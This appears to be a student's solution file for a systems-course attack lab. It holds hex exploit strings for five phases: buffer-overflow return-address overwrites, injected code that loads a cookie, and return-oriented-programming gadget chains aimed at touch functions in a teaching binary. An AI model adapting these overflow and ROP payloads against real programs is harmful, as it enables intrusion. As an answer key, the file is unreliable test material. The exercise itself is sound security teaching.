Phase1:
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
57 1c 40 00 00 00 00 00

Phase2:
48 c7 c7 e7 e9 88 57 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
88 2c 67 55 00 00 00 00
83 1c 40 00 00 00 00 00


Phase3:
/* touch3 */
48 c7 c7 d0 2c 67 55 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
88 2c 67 55 00 00 00 00
54 1d 40 00 00 00 00 00
35 37 38 38 65 39 65 37


Phase4:
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* padding 56 bytes */
ea 1d 40 00 00 00 00 00 /* gadget 1: pop %rax */
e7 e9 88 57 00 00 00 00 /* cookie */
f8 1d 40 00 00 00 00 00 /* gadget 2: mov %rax,%rdi */
83 1c 40 00 00 00 00 00 /* touch2 */

Phase5:
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
64 1e 40 00 00 00 00 00
f8 1d 40 00 00 00 00 00
ea 1d 40 00 00 00 00 00
48 00 00 00 00 00 00 00
e2 1e 40 00 00 00 00 00
4a 1e 40 00 00 00 00 00
3e 1e 40 00 00 00 00 00
1d 1e 40 00 00 00 00 00
f8 1d 40 00 00 00 00 00
54 1d 40 00 00 00 00 00
35 37 38 38 65 39 65 37



